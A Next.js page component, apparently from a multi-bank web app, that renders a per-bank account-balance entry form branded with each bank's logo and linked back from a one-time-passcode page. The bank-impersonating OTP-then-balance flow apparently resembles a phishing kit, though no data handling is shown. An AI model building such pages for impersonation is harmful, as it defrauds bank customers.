import Link from 'next/link'
import { notFound } from 'next/navigation'
import type { Metadata } from 'next'
import { ChevronLeft } from 'lucide-react'
import { banks, bankSlug, getBankBySlug } from '@/lib/banks'
import { BankLogo } from '@/components/bank-logo'
import { BalanceForm } from '@/components/balance-form'

export function generateStaticParams() {
  return banks.map((bank) => ({ slug: bankSlug(bank.name) }))
}

export async function generateMetadata({
  params,
}: {
  params: Promise<{ slug: string }>
}): Promise<Metadata> {
  const { slug } = await params
  const bank = getBankBySlug(slug)
  if (!bank) return { title: 'Bank not found' }
  return {
    title: `${bank.name} | Account Balance`,
    description: `Enter your current ${bank.name} account balance.`,
  }
}

export default async function BalancePage({
  params,
}: {
  params: Promise<{ slug: string }>
}) {
  const { slug } = await params
  const bank = getBankBySlug(slug)
  if (!bank) notFound()

  return (
    <main className="min-h-dvh">
      {/* Header */}
      <header className="border-b border-border bg-card">
        <div className="mx-auto flex max-w-md items-center gap-3 px-4 py-4">
          <Link
            href={`/bank/${slug}/otp`}
            aria-label="Back to OTP"
            className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg text-foreground transition-colors duration-100 hover:bg-secondary focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:bg-secondary active:scale-90"
          >
            <ChevronLeft className="h-5 w-5" aria-hidden="true" />
          </Link>
          <BankLogo bank={bank} />
          <div className="min-w-0">
            <h1 className="truncate text-base font-bold capitalize">
              {bank.name}
            </h1>
            <p className="text-xs text-muted-foreground">{bank.category} bank</p>
          </div>
        </div>
      </header>

      <div className="mx-auto max-w-md px-4 py-5">
        <BalanceForm slug={slug} bankName={bank.name} />
      </div>
    </main>
  )
}
